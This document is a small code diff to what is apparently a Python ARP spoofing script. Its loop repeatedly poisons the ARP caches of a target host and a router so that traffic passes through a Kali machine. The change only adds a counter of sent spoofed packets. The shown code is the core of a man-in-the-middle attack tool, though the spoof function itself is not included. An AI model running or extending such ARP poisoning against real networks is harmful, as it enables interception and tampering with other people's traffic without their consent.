@@ -24,5 +24,6 @@ sent_packages_count = 0
 while True:
     spoof("192.168.2.79", "192.168.1.1")  # target ip and router ip
     spoof("192.168.1.1", "192.168.2.75")  # router ip and kali ip
-    print("[+] Two packages sent " + str(sent_packages_count))
+    sent_packages_count = sent_packages_count + 2
+    print("[+] Two packages sent: " + str(sent_packages_count))
     time.sleep(2)
